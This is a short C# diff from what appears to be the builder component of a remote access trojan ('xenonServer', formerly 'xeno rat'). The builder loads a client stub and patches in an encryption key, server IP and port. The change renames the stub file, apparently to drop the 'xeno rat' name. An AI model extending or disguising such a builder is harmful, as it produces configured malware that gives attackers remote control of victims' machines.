@@ -1613,7 +1613,7 @@ namespace xenonServer
                 }
                 AddLog("Building client...", Color.Blue);
                 string filePath = saveFileDialog.FileName;
-                ModuleDefMD module = ModuleDefMD.Load("stub\\xeno rat client.exe");
+                ModuleDefMD module = ModuleDefMD.Load("stub\\xenonClient.exe");
                 SetEncryptionKey(module, Utils.CalculateSha256Bytes(textBox14.Text));
                 SetServerIp(module, textBox12.Text);
                 SetServerPort(module, int.Parse(textBox13.Text));
